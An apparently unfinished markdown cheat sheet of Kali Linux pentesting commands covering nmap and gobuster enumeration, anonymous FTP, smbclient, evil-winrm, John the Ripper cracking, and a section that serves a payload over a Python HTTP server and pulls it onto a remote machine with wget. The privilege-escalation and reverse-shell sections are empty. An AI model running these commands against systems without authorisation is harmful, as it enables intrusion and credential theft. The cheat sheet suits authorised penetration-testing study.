# Offensive Security Tools

***

<br />

Here you will find a useful collection of commands and file resource locations used in Pentesting operations. This reference is will go hand in hand with Kali Linux.

<br />

***
<br />
<br />

# General Enumeration

***
 
## NMAP

<br />

**OVERVIEW**
 
|   |  	 | 
| :-----------: | :-----------: |
| Description | 	  A network scanning tool that identifies devices, ports, services, and operating systems  |  
| Download | Pre-installed on Kali Linux  |   

<br />

**USAGE**

<br />

```bash
nmap -p- --min-rate 5000 -sC -sV {IP ADDRESS}
```

<br />


<br />

## NMAP Automator

<br />

**OVERVIEW**

|   |  	 | 
| :-----------: | :-----------: |
| Description | 	Useful script that automates multiple enumeration scans in succession  | 
| Download | [nmapAutomator.sh](https://github.com/21y4d/nmapAutomator/blob/master/nmapAutomator.sh) |    

<br />

**USAGE**

<br />

```bash
./nmapAutomator.sh --host {IP ADDRESS} --type All
```

<br />

***

# Port Enumeration

<br />

## FTP [21]

<br />

### ftp

<br />

**OVERVIEW**

|   |  	 | 
| :-----------: | :-----------: |
| Description | 	Connect to FTP server  | 
| Download | Pre-installed on Kali Linux |    

<br />

**USAGE**

<br />

```bash
ftp {IP ADDRESS}

# Default Credentials
anonymous

# Directory Command   
dir
# Download Command    
get
# Upload Command      
put
```

<br />

<br />
## SSH [22] 

<br />
## DNS [53]

<br />
## FINGER [79]

<br />
## Web Server [80, 443]

<br />

### gobuster

<br />

**OVERVIEW**
 
|   |  	 | 
| :-----------: | :-----------: |
| Description | 	  Brute Forcing Web Directories| 
| Notes | Not recursive, only digs one level deep |  
| Download | Pre-installed on Kali Linux  |   

<br />

**USAGE**

<br />

```bash
gobuster dir -u {IP ADDRESS} -w /usr/share/wordlists/dirb/common.txt
```

<br />

**ALTERNATIVE WORD LISTS**


<br />

```bash
┌──(kali㉿kali)-[/usr/share/wordlists/dirb]

big.txt  
catala.txt  
common.txt  
euskera.txt  
extensions_common.txt  
indexes.txt  
mutations_common.txt  
others  
small.txt  
spanish.txt  
stress  
vulns

┌──(kali㉿kali)-[/usr/share/wordlists/dirbuster]

apache-user-enum-1.0.txt      
apache-user-enum-2.0.txt
directories.jbrofuzz   
directory-list-1.0.txt  
directory-list-2.3-small.txt   
directory-list-lowercase-2.3-small.txt
directory-list-2.3-medium.txt 
directory-list-lowercase-2.3-medium.txt
```

<br />



## Kerberos [88] 

<br />

## POP3 [110] 

<br />

## SNMP [161] 

<br />

## LDAP [389]

<br />

## SMB [445]

### smbclient

<br />

**OVERVIEW**

|   |  	 | 
| :-----------: | :-----------: |
| Description | 	Connect to SMB  | 
| Download | Pre-installed on Kali Linux |    

<br />

**USAGE**

<br />

```bash
# List all SMB Shares
smbclient -L {TARGET_IP}

# Authenticate with local credentials
smbclient -N \\\\{TARGET_IP}\\{SHARE} 

# Authenticate with Administrator 
smbclient -N \\\\{TARGET_IP}\\{SHARE} -u Administrator
```

<br />

<br />

## MSSQL [1433] 

<br />

## NFS [2049]


<br />

## RDP [3389]

<br />

## WINRM [5985, 5986] 

<br />

**OVERVIEW**
 
|   |  	 | 
| :-----------: | :-----------: |
| Description | 	  A tool used to hack WINRM from a linux console | 
| Download | Pre-installed on Kali Linux  |   

<br />

**USAGE**

<br />

```bash
evil-winrm -i {IP ADDRESS} -u {USERNAME} -p {PASSWORD}
```

<br />

# Password Cracking

***

## John The Ripper

<br />

**OVERVIEW**
 
|   |  	 | 
| :-----------: | :-----------: |
| Description | 	  Password/hash cracking tool | 
| Download | Pre-installed on Kali Linux  |   

<br />

**USAGE**

<br />

```bash
john -w=/usr/share/wordlists/rockyou.txt {file.txt}
```

<br />

# Payload File Transfer

***

## 1) Python Server

<br />

**USAGE**

<br />

```bash
# Host a personal server on client machine
sudo python3 -m http.server {PORT}

# {PORT}: Port to open for transfer
```
<br />

## 2) WGET 

<br />

**USAGE**

<br />

```bash
# Download files on the remote machine
wget http://{IP ADDRESS}/{FILE} -outfile {FILE}

# {IP ADDRESS}: Python Server IP Address
# {FILE}: The payload to be trasnfered
```
<br />

# Privilege Escalation

## Linux

## Windows


# Reverse Shell

## Linux

## Windows



